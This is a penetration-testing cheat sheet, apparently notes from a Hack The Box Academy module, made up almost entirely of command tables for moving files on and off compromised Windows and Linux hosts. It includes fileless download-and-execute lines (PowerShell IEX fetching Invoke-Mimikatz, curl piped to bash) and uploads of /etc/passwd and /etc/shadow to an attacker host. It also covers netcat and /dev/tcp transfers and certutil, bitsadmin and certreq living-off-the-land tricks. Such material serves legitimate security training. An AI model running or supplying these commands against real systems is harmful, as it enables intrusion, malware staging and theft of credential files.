# File Transfers

### Windows File Transfer Methods

| **Command** | **Description** |
| --------------|-------------------|
| **MD and Base64 File encoding** | |
| `md5sum id_rsa` | Checks md value of a file in linux |
| `cat id_rsa \|base64 -w 0;echo` | File to base64 - encode from linux |
| `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))` | Encode File Using PowerShell |
| `echo BASE64STRING \| base64 -d > hosts` | Decode Base64 String in Linux |
| **File download in windows** | |
| `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("Base 64 string"))` | Decoding the base64 string in windows -PWSH |
| `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5` | Checking the md value of a file in windows -PWSH |
| `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')` **OR** `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') \| IEX` | PowerShell DownloadString - Fileless Method -PWSH |
| `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1` | From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. -PWSH |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 \| IEX` | There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing. -PWSH |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command -PWSH |
| **SMB File Sharing** | |
| `sudo impacket-smbserver share -smb2support /tmp/smbshare` **OR** `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` | We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket |
| `copy \\192.168.220.133\share\nc.exe` **OR** `net use n: \\192.168.220.133\share /user:test test`| Copy a File from the SMB Server -CMD |
| **FTP File Sharing** | |
| `sudo pip3 install pyftpdlib` |  Installing the FTP Server Python3 Module - pyftpdlib |
| `sudo python3 -m pyftpdlib --port 21` | Setting up a Python3 FTP Server |
| `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')` |  Transfering Files from an FTP Server Using PowerShell |
| **PowerShell Web Uploads** | |
| `pip3 install uploadserver` | Installing a Configured WebServer with Upload |
| `python3 -m uploadserver` | Installing a Configured WebServer with Upload |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts` | Uploading the file using the script |
| **PowerShell Base64 Web Upload** | |
| `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64` | Uploading the file using Powershell script |
| `nc -lvnp 8000` | We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file. |
| `echo <base64> \| base64 -d -w 0 \> hosts` | Decoding |
| **SMB Uploads** | |
| `sudo pip install wsgidav cheroot` |  Installing WebDav Python modules | 
| `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` | Using the WebDav Python module |
| `dir \\192.168.49.128\DavWWWRoot` | Connecting to the Webdav Share -CMD |
| `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\` | Uploading Files using SMB |
| **FTP Uploads** | |
| `sudo python3 -m pyftpdlib --port 21 --write` | Starting the upload server |
| `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` | PowerShell Upload File using ftp |

### Linux File Transfer Methods

| **Command** | **Description** |
| --------------|-------------------|
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a File Using wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a File Using wget |
| `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh \| bash` | Fileless Download with cURL |
| `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py \| python3` |  Fileless Download with wget |
| | |
| **Download with Bash (/dev/tcp)** | |
| `exec 3<>/dev/tcp/10.10.10.32/80` | Connect to the Target Webserver | 
| `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3` | HTTP GET Request |
| `cat <&3` | Print the Response |
| | |
| **SSH Download / Upload** | |
| `scp plaintext@192.168.49.128:/root/myroot.txt .` | Linux - Downloading Files Using SCP |
| `scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/` | File Upload using SCP |
| | |
| **Web Upload** | |
| `python3 -m pip install --user uploadserver` | Pwnbox - Start Web Server |
| `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'` | Pwnbox - Create a Self-Signed Certificate |
| `mkdir https && cd https` | Pwnbox - Start Web Server |
| `python3 -m uploadserver 443 --server-certificate /root/server.pem` | Pwnbox - Start Web Server |
| `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure` | Linux - Upload Multiple Files |
| | |
| **Alternative Web File Transfer Method** | |
| `python3 -m http.server` | Linux - Creating a Web Server with Python3 |
| `python2.7 -m SimpleHTTPServer` | Linux - Creating a Web Server with Python2.7 |
| `php -S 0.0.0.0:8000` | Linux - Creating a Web Server with PHP |
| `ruby -run -ehttpd . -p8000` | Linux - Creating a Web Server with Ruby |
| `wget 192.168.49.128:8000/filetotransfer.txt` | Download the File from the Target Machine onto the Pwnbox |

### Transfering Files with Code

| **Command** | **Description** |
| --------------|-------------------|
| **Python** | |
| `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` | Python 2 - Download |
| `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` | Python 3 - Download |
| `python3 -m uploadserver` | Starting the Python uploadserver Module |
| `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'` | Uploading a File Using a Python One-liner |
| | |
| **PHP** | |
| `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | PHP Download with File_get_contents() |
| `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'` | PHP Download with Fopen() |
| `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' \| bash` | PHP Download a File and Pipe it to Bash |
| | |
| **Other Languages** | |
| `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'` | Ruby - Download a File |
| `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'` | Perl - Download a File |
| `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1` | Download a File Using JavaScript and cscript.exe -CMD |

#### CSCRIPT.exe [JS]
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
#### OR [VBSCRIPT]

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Miscellaneous File Transfer Methods


| **Command** | **Description** |
| --------------|-------------------|
| **File Transfer with Netcat and Ncat** | |
| `nc -l -p 8000 > SharpKatz.exe` |  NetCat - Compromised Machine - Listening on Port 8000 |
| `ncat -l -p 8000 --recv-only > SharpKatz.exe` | Ncat - Compromised Machine - Listening on Port 8000 |
| `nc -q 0 192.168.49.128 8000 < SharpKatz.exe` | Netcat - Attack Host - Sending File to Compromised machine |
| `ncat --send-only 192.168.49.128 8000 < SharpKatz.exe` | Ncat - Attack Host - Sending File to Compromised machine |
| `sudo nc -l -p 443 -q 0 < SharpKatz.exe` | Attack Host - Sending File as Input to Netcat |
| `nc 192.168.49.128 443 > SharpKatz.exe` | Compromised Machine Connect to Netcat to Receive the File |
| `sudo ncat -l -p 443 --send-only < SharpKatz.exe` | Attack Host - Sending File as Input to Ncat |
| `ncat 192.168.49.128 443 --recv-only > SharpKatz.exe` | Compromised Machine Connect to Ncat to Receive the File |
| `cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe` | If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/, Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File |
| | |
| [PowerShell Session File Transfer](https://academy.hackthebox.com/module/24/section/161) | |
| | |
| **RDP** | |
| `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer` | Mounting a Linux Folder Using xfreerdp- To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session. |

### File Encryption on Windows 

| **Command** | **Description** |
| --------------|------------------- |
| **File Encryption on Windows** | |
| `Import-Module .\Invoke-AESEncryption.ps1` | Import Module Invoke-AESEncryption.ps1 -PWSH |
| `Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt` | File Encryption Example -PWSH |
| | |
| **File Encryption on Linux** | |
| `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc` | Encrypting /etc/passwd with openssl |
| `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd` | Decrypt passwd.enc with openssl |

### [Catching Files over HTTP/S](https://academy.hackthebox.com/module/24/section/681)

### [Living off The Land]

##### [LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins](https://gtfobins.github.io/) for Linux are websites where we can search for binaries we can use for different functions.

| **Command** | **Description** |
| --------------|------------------- |
| `certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini` | Upload win.ini to our Pwnbox -CMD |
| `sudo nc -lvnp 80` | File Received in our Netcat Session |
| | |
| **OPENSSL** |  |
| `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem` | Create Certificate in our Pwnbox |
| `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh` | Stand up the Server in our Pwnbox |
| `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh` | Download File from the Compromised Machine |
| | |
| **Other Common Living off the Land tools Powershell** | |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | File Download with Bitsadmin |
| `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"` | PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers. DOWNLOAD |
| `Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql` | UPLOAD |
| | |
| **Certutil** |  Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage. |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a File with Certutil -CMD |
